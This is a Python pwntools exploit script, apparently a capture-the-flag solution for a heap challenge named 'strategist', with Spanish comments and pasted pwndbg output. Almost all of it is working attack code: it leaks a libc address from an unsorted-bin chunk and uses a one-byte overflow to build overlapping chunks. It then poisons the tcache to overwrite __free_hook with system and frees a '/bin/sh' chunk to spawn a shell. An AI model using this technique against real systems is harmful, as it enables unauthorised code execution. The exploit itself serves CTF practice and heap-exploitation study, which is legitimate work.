from pwn import *

"""
Mis plus:
-  Tamaño arbitrario para definir chunks
Mis Restricciones
- No puedes hacer free a un chunk que fue liberado con anterioridad
"""

# Literal todo esta aca :v
# https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c

gs = '''
continue
'''

elf = context.binary = ELF("./strategist")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def malloc(size, content):
    io.sendlineafter("> ", b"1")
    io.sendlineafter("> ", str(size).encode())
    io.sendafter("> ", content)

def show(idx):
    io.sendlineafter("> ", b"2")
    io.sendlineafter("> ", str(idx).encode())
    io.recvuntil(b"]: ")
    return io.recvline()

def edit(idx, content):
    io.sendlineafter("> ", b"3")
    io.sendlineafter("> ", str(idx).encode())
    io.sendafter("> ", content)

def free(idx):
    io.sendlineafter("> ", b"4")
    io.sendlineafter("> ", str(idx).encode())
    
context.terminal = ['gnome-terminal', '-e']
io = start()

libc_base = 0x7ffff7800000
one_gadget = [0x4f3ce, 0x4f3d5, 0x4f432, 0x10a41c]

# La diferencia es que yo quiero que los chunks seteados, sean liberados en unsorted bins
# Por eso 0x520 ;v

malloc(0x520, b"A"*128)

malloc(0x520, b"A"*128)

free(0)
free(1)

# Unsorted Bins
# printf("Now the tcache list has [ %p -> %p ].\n", b, a);
#printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
#		   "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);

# Un byte de sobrescritura para poder likear sobre el chunk escrito que estaba en unsorted bins
malloc(0x520, b"\x61") 

libc.address = u64(show(0).split(b': ')[1].strip().ljust(8, b"\x00")) - 0x3ebc61

print(f"System: {hex(libc.sym.system)}")

free(0)

malloc(0x48, b"x"*0x48)
malloc(0x48, b"y"*0x48)
malloc(0x48, b"z"*0x48)


edit(0, b"x"*0x48 + p8(0x80))

free(1)
free(2)


malloc(0x70, b"y"*0x50 + p64(libc.sym.__free_hook))   # 0
"""
tcachebins
0x50 [  1]: 0x555555604710 —▸ 0x7ffff7bed8e8 (__free_hook) ◂— ...
0x410 [  1]: 0x555555604260 ◂— 0

"""

malloc(0x40, b"/bin/sh\x00")   # 1
"""

pwndbg> dq 0x555555604710
0000555555604710     0068732f6e69622f 0000000000000000      (/bin/sh\x00)
0000555555604720     7a7a7a7a7a7a7a7a 7a7a7a7a7a7a7a7a
0000555555604730     7a7a7a7a7a7a7a7a 7a7a7a7a7a7a7a7a
0000555555604740     7a7a7a7a7a7a7a7a 7a7a7a7a7a7a7a7a

tcachebins
0x50 [  0]: 0x7ffff7bed8e8 (__free_hook) ◂— ...
0x410 [  1]: 0x555555604260 ◂— 0

"""

malloc(0x40, p64(libc.sym.system)) # 2

"""

pwndbg> x/gx 0x7ffff7bed8e8
0x7ffff7bed8e8 <__free_hook>:	0x00007ffff784f550
pwndbg> dq 0x7ffff7bed8e8
00007ffff7bed8e8     00007ffff784f550 0000000000000000
00007ffff7bed8f8     0000000000000000 0000000000000000
00007ffff7bed908     0000000000000000 0000000000000000
00007ffff7bed918     0000000000000000 0000000000000000
pwndbg> x/gx 0x00007ffff784f550
0x7ffff784f550 <system>:	0xfa66e90b74ff8548

"""

#input("PAUSE")
free(2)

io.interactive()